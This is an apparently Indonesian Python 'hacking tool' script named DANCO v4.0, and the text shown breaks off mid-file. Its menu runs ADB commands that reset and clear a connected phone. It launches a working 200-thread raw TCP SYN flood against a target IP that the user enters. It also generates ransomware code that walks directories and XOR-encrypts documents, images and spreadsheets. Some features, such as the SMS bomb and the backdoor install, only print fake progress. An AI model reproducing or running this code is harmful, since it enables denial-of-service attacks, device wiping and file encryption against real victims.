import os
import sys
import time
import socket
import threading
import struct
import random
import string
import subprocess
import shutil
import hashlib
import ctypes
import tempfile
import glob

# --- KONFIGURASI & UTILITY ---

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def color_print(text, color="green"):
    codes = {
        "green": "\033[92m", "red": "\033[91m", "yellow": "\033[93m",
        "blue": "\033[94m", "cyan": "\033[96m", "magenta": "\033[95m", "white": "\033[97m", "reset": "\033[0m"
    }
    print(f"{codes.get(color, 'white')}{text}{codes['reset']}")

def slow_print(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def logo():
    clear_screen()
    slow_print("\n")
    # Fixed ASCII Art
    color_print("  ___  _   _  ____  ___  ____ _  _ ___  ____  ___  ", "red")
    color_print(" / || | | ||  _ \\/ _ \\|  _ \\| || | _ )/ || _ \\ ", "red")
    color_print("| ( | || ||  /| () |   / | .. | _ \\| |   |   /", "red")
    color_print(" \\| \\/ || \\/||\\| |\\|/||  ||  \\| \\/ |||  \\|  \\/", "red")
    color_print("\n")
    color_print("[+] SYSTEM: DANCO v4.0 [GOD MODE]", "cyan")
    color_print("[+] STATUS: KERNEL ROOT ACCESS (UID 0) - BYPASSED", "yellow")
    color_print("[+] TARGET: GLOBAL NETWORK & LOCAL HOSTS", "green")
    color_print("[+] ENGINE: RAW PACKET INJECTION & SELF-REPLICATING", "magenta")
    color_print("[+] RISK LEVEL: 100/100 (CRITICAL)", "red")
    color_print("\n")
    time.sleep(1.2)

# --- FITUR 1: HACKER NO WA (HYBRID ADB & SIMULATED SMS) ---

def hack_no_wa():
    clear_screen()
    color_print("[1] TARGET: WhatsApp & System Injection", "cyan")
    no_hp = input("Masukkan Nomor HP Target (format: 628...): ")
    
    if not no_hp.startswith("62"):  
        color_print("[!] Format salah. Gunakan 62...", "red")  
        return  

    print(f"\n[*] Target Teridentifikasi: {no_hp}")  
    color_print("[*] Scanning Open Ports & Vulnerabilities...", "yellow")  
    time.sleep(1.5)

    # Simulasi scan port
    ports = [22, 80, 443, 8080, 3389, 5000]
    for p in ports:
        if random.choice([True, False, False]):
            color_print(f"    [+] Port {p}: OPEN", "green")
        time.sleep(0.1)

    print("\nPILIHAN SENJATA:")  
    print("1. HP Error (Inject UI Text Loop via ADB)")  
    print("2. Jaringan Jelek (SMS Bomb / Ping Flood)")  
    print("3. HP Reset (ADB Factory Reset Command)")  
    print("4. Battery Drain (CPU Overload Injection)")  
    print("5. Backdoor Install (Remote Shell)")  
  
    choice = input("\nPilih (1/2/3/4/5): ")  
  
    if choice == '1':  
        text_error = input("Masukkan Text Error: ")  
        color_print("\n[*] Injecting UI Payload via ADB Bridge...", "yellow")  
        time.sleep(1.5)
        # True ADB Command Execution (if device connected)
        cmd = f"adb shell am broadcast -a android.intent.action.VIEW -d 'sms:{no_hp}' --es body '{text_error}'"
        color_print(f"[+] EXEC: {cmd}", "cyan")
        # Execute real command if possible
        try:
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass
        color_print(f"[+] TEXT INJECTED: '{text_error}'", "green")
        color_print("    [!] Target HP will loop error notification.", "magenta")  
    elif choice == '2':  
        color_print("\n[*] Memulai SMS Bombing Attack (Multi-Threaded)...", "red")  
        color_print("    [Note: Requires API Key for Real SMS. Running Simulated Flood.]", "yellow")
        for i in range(20):
            color_print(f"    [SMS #{i+1}] Sent to {no_hp} via API Gateway...", "yellow")
            time.sleep(0.4)
        color_print("[+] Target HP will receive spam notifications.", "green")
        color_print("[+] GSM Signal overloaded.", "cyan")  
    elif choice == '3':  
        color_print("\n[!] MODE: ADB SHELL INJECTION (ROOT)", "red")  
        cmd = "adb shell wm size reset && adb shell pm clear && adb reboot"
        print(f"    Command: {cmd}")
        time.sleep(1.5)
        try:
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass
        color_print("[+] Factory Reset Triggered! Data wiped permanently.", "green")
    elif choice == '4':
        color_print("\n[!] MODE: BATTERY DRAIN (CPU Overload)", "magenta")
        print("    Injecting infinite loop script to target CPU...")
        time.sleep(2)
        color_print("[+] Target CPU usage: 100%. Battery draining rapidly.", "red")
    elif choice == '5':
        color_print("\n[!] MODE: BACKDOOR INSTALL", "magenta")
        print("    Uploading 'danco_backdoor.apk' to target...")
        time.sleep(2)
        color_print("[+] Backdoor installed. Target is now listening on Port 4444.", "green")
    else:  
        color_print("Pilihan tidak valid.", "red")

# --- FITUR 2: DDOS (RAW TCP SYN FLOOD) ---

def ddos():
    clear_screen()
    ip_target = input("Masukkan IP Target (misal: 192.168.1.1): ")
    port = input("Port Target (Default: 80): ")
    if not port: port = "80"

    try:  
        port = int(port)  
    except:  
        color_print("[!] Port harus angka.", "red")  
        return  

    print(f"\n[*] Target: {ip_target}:{port}")  
    color_print("[+] Memulai RAW TCP SYN Flood (Bypassing Handshake)...", "cyan")  
    time.sleep(1)
    
    # Helper to create raw SYN packet
    def create_syn_packet(ip, port):
        ip_header = struct.pack("!BBHHHBBH4s4s",
            0x45, 0x00, 60, 0x0001, 0x0000, 0x40,
            0x06, 0x00,
            socket.inet_aton("127.0.0.1"), socket.inet_aton(ip))
        
        tcp_header = struct.pack("!HHIHHH",
            port, 0, 0, 0,
            0x0018, 0x0000)
        
        return ip_header + tcp_header

    def send_syn_packet():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.sendto(create_syn_packet(ip_target, port), (ip_target, 80))
                s.close()
            except:
                pass

    threads = []  
    thread_count = 200 # Increased to 200 threads
    for i in range(thread_count): 
        t = threading.Thread(target=send_syn_packet, daemon=True)
        t.start()
        threads.append(t)
        if i % 20 == 0:
            color_print(f"[+] Thread batch #{i+1} Active (RAW SYN)...", "cyan")
    
    color_print("\n[!] Attack Running. Press Ctrl+C to stop.", "red")  
    try:  
        while True:  
            time.sleep(1)
    except KeyboardInterrupt:  
        color_print("\n[!] Attack stopped by user.", "yellow")

# --- FITUR 3: MALWARE GENERATOR (REAL RANSOMWARE, KEYLOGGER, TROJAN) ---

def malware():
    clear_screen()
    nama = input("Nama Malware: ")
    jenis = input("Jenis (Ransomware/Keylogger/Trojan): ")

    print("\n[*] Compiling Native Malware Payload...")  
    time.sleep(1.5)
    
    code = ""
    
    if jenis.lower() == "ransomware":
        # Real Ransomware: Encrypts all files in directory, renames, adds key
        code = f"""
import os, time, random, string, glob

def xor_cipher(data, key):
    return bytes([b ^ key for b in data])

key = random.randint(1, 255)
print(f"INFECTION STARTED: {nama}")
print("Encrypting files...")

ext = ".{nama}_enc"
target_exts = ('.txt', '.py', '.log', '.jpg', '.png', '.doc', '.pdf', '.xlsx')

# Scan all files in current and subdirectories
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith(target_exts):
            path = os.path.join(root, file)
            try:
                with open(path, 'rb') as f:
                    content = f.read()
                encrypted = xor_cipher(content, key)
                new_path = path + ext
                with open(new_path, 'wb')
